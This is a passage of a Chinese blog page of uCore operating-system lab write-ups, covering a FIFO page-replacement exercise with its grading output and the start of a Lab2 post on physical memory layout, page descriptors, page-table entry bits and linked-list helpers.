page-&gt;pra_vaddr:用于保存该物理页所对应的虚拟地址 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   ret = <span class="number">0</span>;</span><br><span class="line">failed:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习2-补充完成基于FIFO的页面替换算法"><a href="#练习2-补充完成基于FIFO的页面替换算法" class="headerlink" title="练习2-补充完成基于FIFO的页面替换算法"></a>练习2-补充完成基于FIFO的页面替换算法</h2><p>FIFO 中，当新加入一个物理页时，我们只需将该物理页加入至链表首部即可，当需要换出某个物理页时，选择链表末尾的物理页即可</p>
<p>先看看 FIFO 初始化函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">list_entry_t</span> pra_list_head; <span class="comment">/* swap manager中:&quot;可交换已分配&quot;链表的链表头 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_init_mm(struct mm_struct *mm)</span><br><span class="line">&#123;     </span><br><span class="line">     list_init(&amp;pra_list_head);</span><br><span class="line">     mm-&gt;sm_priv = &amp;pra_list_head;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">list_init</span><span class="params">(<span class="keyword">list_entry_t</span> *elm)</span> </span>&#123;</span><br><span class="line">    elm-&gt;prev = elm-&gt;next = elm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>让 mm-&gt;sm_priv 指向 pra_list_head 的地址</li>
<li>现在，我们可以从内存控制结构体 mm_struct 访问 FIFO PRA（FIFO页面替换算法）</li>
</ul>
<p>接下来就是需要我们进行完善的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> <span class="comment">/* 执行目标页加入队列的操作(插入目标页头部即可) */</span></span><br><span class="line">_fifo_map_swappable(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page *page, <span class="keyword">int</span> swap_in) </span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv; <span class="comment">/* 获取pra_list_head */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);</span><br><span class="line"> 	<span class="comment">/* 获取用于连接上一个和下一个&quot;可交换已分配&quot;的物理页 */</span></span><br><span class="line">    </span><br><span class="line">    assert(entry != <span class="literal">NULL</span> &amp;&amp; head != <span class="literal">NULL</span>); <span class="comment">/* 断言获取成功 */</span></span><br><span class="line">    <span class="comment">//record the page access situlation</span></span><br><span class="line">    <span class="comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span> </span><br><span class="line">    <span class="comment">//(1)link the most recent arrival page at the back of the pra_list_head qeueue.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> <span class="comment">/* 执行换出队列的操作(把链表尾部的page脱链即可) */</span></span><br><span class="line">_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="keyword">int</span> in_tick)</span><br><span class="line">&#123; </span><br><span class="line">     <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv; <span class="comment">/* 获取pra_list_head */</span></span><br><span class="line">         assert(head != <span class="literal">NULL</span>);</span><br><span class="line">     assert(in_tick==<span class="number">0</span>);</span><br><span class="line">     <span class="comment">/* Select the victim */</span></span><br><span class="line">     <span class="comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span> </span><br><span class="line">     <span class="comment">//(1)  unlink the  earliest arrival page in front of pra_list_head qeueue</span></span><br><span class="line">     <span class="comment">//(2)  assign the value of *ptr_page to the addr of this page</span></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体实现特别简单：（参考 CSapp 中的 malloc lab）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> <span class="comment">/* 执行目标页加入队列的操作(插入目标页头部即可) */</span></span><br><span class="line">_fifo_map_swappable(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page *page, <span class="keyword">int</span> swap_in) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// mm:指定地址对应的&quot;所属的内存描述符&quot;</span></span><br><span class="line">    <span class="comment">// addr:发生目标虚拟地址</span></span><br><span class="line">    <span class="comment">// page:将要被插入的物理页</span></span><br><span class="line">    <span class="comment">// swap_in:swap_manager中的函数指针(将可交换页面映射到mm_结构时调用)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv; <span class="comment">/* 获取pra_list_head */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link); <span class="comment">/* page-&gt;pra_page_link==NULL */</span></span><br><span class="line">    assert(entry != <span class="literal">NULL</span> &amp;&amp; head != <span class="literal">NULL</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 结点-&gt;prev  &lt;--1--&gt;  结点(pra_list_head)  &lt;--2--&gt;  结点-&gt;next */</span></span><br><span class="line">    </span><br><span class="line">    list_add(head, entry); <span class="comment">/* 直接插入头部(&quot;2&quot;号位置) */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> <span class="comment">/* 执行换出队列的操作(把链表尾部的page脱链即可) */</span> </span><br><span class="line">_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="keyword">int</span> in_tick)</span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// mm:指定地址对应的&quot;所属的内存描述符&quot;</span></span><br><span class="line">    <span class="comment">// ptr_page:将要被换出的物理页(会被返回出来)</span></span><br><span class="line">    <span class="comment">// in_tick:信息表示位</span></span><br><span class="line">    </span><br><span class="line">     <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv; <span class="comment">/* 获取pra_list_head */</span></span><br><span class="line">         assert(head != <span class="literal">NULL</span>);</span><br><span class="line">     assert(in_tick==<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">list_entry_t</span> *le = head-&gt;prev; <span class="comment">/* 获取pra_list_head-&gt;prev(链表尾) */</span></span><br><span class="line">     assert(head!=le);</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> le2page(le, pra_page_link); <span class="comment">/* 根据链表信息获取该page的位置 */</span></span><br><span class="line">     list_del(le); <span class="comment">/* 脱链操作 */</span></span><br><span class="line">     assert(p !=<span class="literal">NULL</span>);</span><br><span class="line">     *ptr_page = p;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">➜  lab3 make grade</span><br><span class="line">Check SWAP:              (<span class="number">1.2</span>s)</span><br><span class="line">  -check pmm:                                OK</span><br><span class="line">  -check page table:                         OK</span><br><span class="line">  -check vmm:                                WRONG</span><br><span class="line">   -e !! error: missing <span class="string">&#x27;page fault at 0x00000100: K/W [no page found].&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;check_pgfault() succeeded!&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;check_vmm() succeeded.&#x27;</span></span><br><span class="line"></span><br><span class="line">  -check swap page fault:                    WRONG</span><br><span class="line">   -e !! error: missing <span class="string">&#x27;page fault at 0x00001000: K/W [no page found].&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;page fault at 0x00002000: K/W [no page found].&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;page fault at 0x00003000: K/W [no page found].&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;page fault at 0x00004000: K/W [no page found].&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;write Virt Page e in fifo_check_swap&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;page fault at 0x00005000: K/W [no page found].&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;page fault at 0x00001000: K/W [no page found]&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;page fault at 0x00002000: K/W [no page found].&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;page fault at 0x00003000: K/W [no page found].&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;page fault at 0x00004000: K/W [no page found].&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;check_swap() succeeded!&#x27;</span></span><br><span class="line"></span><br><span class="line">  -check ticks:                              WRONG</span><br><span class="line">   -e !! error: missing <span class="string">&#x27;++ setup timer interrupts&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;100 ticks&#x27;</span></span><br><span class="line">   !! error: missing <span class="string">&#x27;End of Test.&#x27;</span></span><br><span class="line"></span><br><span class="line">Total Score: <span class="number">10</span>/<span class="number">45</span></span><br><span class="line">make: *** [Makefile:<span class="number">260</span>：grade] 错误 <span class="number">1</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/14/Ucore-Lab2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/14/Ucore-Lab2/" class="post-title-link" itemprop="url">Ucore-Lab2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-14 22:55:28" itemprop="dateCreated datePublished" datetime="2022-04-14T22:55:28+08:00">2022-04-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-16 23:42:54" itemprop="dateModified" datetime="2023-03-16T23:42:54+08:00">2023-03-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="项目组成"><a href="#项目组成" class="headerlink" title="项目组成"></a>项目组成</h2><p>相对与实验一，实验二主要增加和修改的文件如上表所示。主要改动如下：</p>
<ul>
<li>boot/bootasm.S：增加了对计算机系统中物理内存布局的探测功能</li>
<li>kern/init/entry.S：根据临时段表重新暂时建立好新的段空间，为进行分页做好准备</li>
<li>kern/mm/default_pmm.[ch]：提供基本的基于链表方法的物理内存管理（分配单位为页，即4096字节）</li>
<li>kern/mm/pmm.[ch]：pmm.h定义物理内存管理类框架struct pmm_manager，基于此通用框架可以实现不同的物理内存管理策略和算法（default_pmm.[ch] 实现了一个基于此框架的简单物理内存管理策略），pmm.c包含了对此物理内存管理类框架的访问，以及与建立、修改、访问页表相关的各种函数实现</li>
<li>kern/sync/sync.h：为确保内存管理修改相关数据时不被中断打断，提供两个功能，一个是保存eflag寄存器中的中断屏蔽位信息并屏蔽中断的功能，另一个是根据保存的中断屏蔽位信息来使能中断的功能（可不用细看）</li>
<li>libs/list.h：定义了通用双向链表结构以及相关的查找、插入等基本操作，这是建立基于链表方法的物理内存管理（以及其他内核功能）的基础，其他有类似双向链表需求的内核功能模块可直接使用list.h中定义的函数</li>
<li>libs/atomic.h：定义了对一个变量进行读写的原子操作，确保相关操作不被中断打断（可不用细看）</li>
<li>tools/kernel.ld：ld形成执行文件的地址所用到的链接脚本，修改了ucore的起始入口和代码段的起始地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">➜  lab2 make qemu</span><br><span class="line">WARNING: Image format was <span class="keyword">not</span> specified <span class="keyword">for</span> <span class="string">&#x27;bin/ucore.img&#x27;</span> <span class="keyword">and</span> probing guessed raw.</span><br><span class="line">         Automatically detecting the format is dangerous <span class="keyword">for</span> raw images, write operations on block <span class="number">0</span> will be restricted.</span><br><span class="line">         Specify the <span class="string">&#x27;raw&#x27;</span> format explicitly to remove the restrictions.</span><br><span class="line">(THU.CST) os is loading ...</span><br><span class="line"></span><br><span class="line">Special kernel symbols:</span><br><span class="line">  entry  <span class="number">0xc0100036</span> (phys)</span><br><span class="line">  etext  <span class="number">0xc0105d24</span> (phys)</span><br><span class="line">  edata  <span class="number">0xc011b000</span> (phys)</span><br><span class="line">  end    <span class="number">0xc011bf28</span> (phys)</span><br><span class="line">Kernel executable memory footprint: <span class="number">112</span>KB</span><br><span class="line">memory management: default_pmm_manager</span><br><span class="line">e820map:</span><br><span class="line">  memory: <span class="number">0009f</span>c00, [<span class="number">00000000</span>, <span class="number">0009f</span>bff], type = <span class="number">1.</span></span><br><span class="line">  memory: <span class="number">00000400</span>, [<span class="number">0009f</span>c00, <span class="number">0009f</span>fff], type = <span class="number">2.</span></span><br><span class="line">  memory: <span class="number">00010000</span>, [<span class="number">000f</span>0000, <span class="number">000f</span>ffff], type = <span class="number">2.</span></span><br><span class="line">  memory: <span class="number">07</span>ee0000, [<span class="number">00100000</span>, <span class="number">07f</span>dffff], type = <span class="number">1.</span></span><br><span class="line">  memory: <span class="number">00020000</span>, [<span class="number">07f</span>e0000, <span class="number">07f</span>fffff], type = <span class="number">2.</span></span><br><span class="line">  memory: <span class="number">00040000</span>, [fffc0000, ffffffff], type = <span class="number">2.</span></span><br><span class="line">kernel panic at kern/mm/default_pmm.c:<span class="number">277</span>:</span><br><span class="line">    assertion failed: (p0 = alloc_page()) == p2 - <span class="number">1</span></span><br><span class="line"><span class="built_in">stack</span> trackback:</span><br><span class="line">Welcome to the kernel debug monitor!!</span><br></pre></td></tr></table></figure>
<h2 id="物理内存管理"><a href="#物理内存管理" class="headerlink" title="物理内存管理"></a>物理内存管理</h2><p>本次实验主要完成ucore内核对物理内存的管理工作</p>
<ul>
<li>为了完成物理内存管理，这里首先需要 <strong>探测可用的物理内存资源</strong> ，了解到物理内存位于什么地方，有多大之后，就以固定页面大小来划分整个物理内存空间，并准备以此为最小内存分配单位来管理整个物理内存，管理在内核运行过程中每页内存，设定其可用状态（free的，used的，还是reserved的）</li>
<li>接着 ucore kernel 就要建立页表， 启动分页机制，让CPU的MMU把预先建立好的页表中的页表项读入到TLB中，根据页表项描述的虚拟页（Page）与物理页帧（Page Frame）的对应关系完成CPU对内存的读、写和执行操作</li>
</ul>
<h2 id="探测系统物理内存布局"><a href="#探测系统物理内存布局" class="headerlink" title="探测系统物理内存布局"></a>探测系统物理内存布局</h2><p>操作系统需要知道了解整个计算机系统中的物理内存如何分布的，哪些被可用，哪些不可用，其基本方法是通过 BIOS 中断调用来帮助完成的</p>
<p>Linux 有多种办法可以获取内存容量，如果一种方式失效，它就会尝试其他办法</p>
<p>在 Linux 2.6 内核中，是用 detect_memory 函数来获取内存容量的，其函数在本质上是通过调用 BIOS 中断 0x15 实现的，分别是 BIOS 中断 0x15 的3个子功能，子功能号要存放到寄存器 EAX AX 中，如下：</p>
<ul>
<li>EAX=0xE820：遍历主机上全部内存</li>
<li>AX=0xE801：分别检测低 15MB 和 16MB ~ 4GB 的内存，最大支持 4GB</li>
<li>AH=0x88：最多检测出 64MB 内存，如果实际内存超过此容量也按照 64MB 返回 </li>
</ul>
<h2 id="uCore物理页结构"><a href="#uCore物理页结构" class="headerlink" title="uCore物理页结构"></a>uCore物理页结构</h2><p>结构体 Page：用于管理各个内存页：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_entry</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span> <span class="comment">/* list_entry其实是两个指针 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">list_entry</span> <span class="title">list_entry_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment">* struct Page - Page descriptor structures. Each Page describes one</span></span><br><span class="line"><span class="comment">* physical page. In kern/mm/pmm.h, you can find lots of useful functions</span></span><br><span class="line"><span class="comment">* that convert Page to other data types, such as phyical address.</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> ref;                <span class="comment">// 当前页被引用的次数,与内存共享有关</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;         <span class="comment">// 标志位的集合,与eflags寄存器类似</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> property;  <span class="comment">// 空闲的连续page数量,这个成员只会用在连续空闲page中的第一个page</span></span><br><span class="line">  <span class="keyword">list_entry_t</span> page_link; <span class="comment">// 两个分别指向上一个和下一个非连续空闲页的两个指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在lab2中，flags 可以设置的位只有<code>reserved</code>位和<code>Property</code>位<ul>
<li><code>reserved</code>位表示：当前页是否被保留，一旦保留该页，则该页无法用于分配</li>
<li><code>Property</code>位表示：当前页是否已被分配（为1则表示已分配）</li>
</ul>
</li>
</ul>
<h2 id="uCore虚拟页结构"><a href="#uCore虚拟页结构" class="headerlink" title="uCore虚拟页结构"></a>uCore虚拟页结构</h2><p>每个页表项（PTE）都由一个32位整数来存储数据，其结构如下：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      31-12      9-11     8    7    6   5   4      3    2   1   0</span><br><span class="line">+<span class="params">--------------</span>+<span class="params">-------</span>+<span class="params">-----</span>+<span class="params">----</span>+<span class="params">---</span>+<span class="params">---</span>+<span class="params">-----</span>+<span class="params">-----</span>+<span class="params">---</span>+<span class="params">---</span>+<span class="params">---</span>+</span><br><span class="line">|     Offset   | Avail | MBZ | PS | D | A | PCD | PWT | U | W | P |</span><br><span class="line">+<span class="params">--------------</span>+<span class="params">-------</span>+<span class="params">-----</span>+<span class="params">----</span>+<span class="params">---</span>+<span class="params">---</span>+<span class="params">-----</span>+<span class="params">-----</span>+<span class="params">---</span>+<span class="params">---</span>+<span class="params">---</span>+</span><br></pre></td></tr></table></figure>
<ul>
<li>0 - <strong>P</strong>resent：表示当前PTE所指向的物理页面是否驻留在内存中</li>
<li>1 - <strong>W</strong>riteable：表示是否允许读写</li>
<li>2 - <strong>U</strong>ser：表示该页的访问所需要的特权级（即User(ring 3)是否允许访问）</li>
<li>3 - <strong>P</strong>ageWriteThough：表示是否使用write through缓存写策略</li>
<li>4 - <strong>P</strong>ageCacheDisable：表示是否 <strong>不对</strong> 该页进行缓存</li>
<li>5 - <strong>A</strong>ccess：表示该页是否已被访问过</li>
<li>6 - <strong>D</strong>irty：表示该页是否已被修改</li>
<li>7 - <strong>P</strong>ageSize：表示该页的大小</li>
<li>8 - <strong>M</strong>ustBeZero：该位必须保留为0</li>
<li>9-11 - <strong>A</strong>vailable：第9-11这三位并没有被内核或中断所使用，可保留给OS使用</li>
<li>12-31 - <strong>O</strong>ffset：目标地址的后20位</li>
</ul>
<h2 id="uCore物理页链表"><a href="#uCore物理页链表" class="headerlink" title="uCore物理页链表"></a>uCore物理页链表</h2><p>结构体 free_area_t：用于定义两个关键的全局变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* free_area_t - 维护一个双向链表来记录空闲（未使用的）页 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> free_list;         <span class="comment">// 链表头部</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_free;           <span class="comment">// 表示空闲页的数量</span></span><br><span class="line">&#125; <span class="keyword">free_area_t</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>虽然 ucore 把这两个变量放入了结构体，但是它还是喜欢把它们当做全局变量来用</li>
</ul>
<p>uCore物理页的插链&amp;脱链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">list_entry_t</span> *</span></span><br><span class="line"><span class="function"><span class="title">list_next</span><span class="params">(<span class="keyword">list_entry_t</span> *listelm)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> listelm-&gt;next; <span class="comment">/* 指向next */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="comment">/* list_add是list_add_after的外包装 */</span></span><br><span class="line">list_add(<span class="keyword">list_entry_t</span> *listelm, <span class="keyword">list_entry_t</span> *elm) &#123;</span><br><span class="line">    <span class="comment">// listelm:	目标链表结点</span></span><br><span class="line">    <span class="comment">// elm: 	将要插入的对象(list_entry_t *elm == NULL)</span></span><br><span class="line">    list_add_after(listelm, elm); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 结点-&gt;prev  &lt;--1--&gt;  结点  &lt;--2--&gt;  结点-&gt;next */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="comment">/* 插入&quot;2&quot;号位置 */</span></span><br><span class="line">list_add_after(<span class="keyword">list_entry_t</span> *listelm, <span class="keyword">list_entry_t</span> *elm) &#123;</span><br><span class="line">    __list_add(elm, listelm, listelm-&gt;next); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="comment">/* 插入&quot;1&quot;号位置 */</span></span><br><span class="line">list_add_before(<span class="keyword">list_entry_t</span> *listelm, <span class="keyword">list_entry_t</span> *elm) &#123;</span><br><span class="line">    __list_add(elm, listelm-&gt;prev, listelm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="comment">/* 正真执行添加操作的是__list_add */</span></span><br><span class="line">__list_add(<span class="keyword">list_entry_t</span> *elm, <span class="keyword">list_entry_t</span> *prev, <span class="keyword">list_entry_t</span> *next) &#123;</span><br><span class="line">    prev-&gt;next = next-&gt;prev = elm;</span><br><span class="line">    elm-&gt;next = next;</span><br><span class="line">    elm-&gt;prev = prev;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="comment">/* list_del是__list_del的外包装 */</span></span><br><span class="line">list_del(<span class="keyword">list_entry_t</span> *listelm) &#123;</span><br><span class="line">    __list_del(listelm-&gt;prev, listelm-&gt;next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="comment">/* 正真执行脱链操作的是__list_del */</span></span><br><span class="line">__list_del(<span class="keyword">list_entry_t</span> *prev, <span class="keyword">list_entry_t</span> *next) &#123;</span><br><span class="line">    prev-&gt;next = next;</span><br><span class="line">    next-&gt;prev = prev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
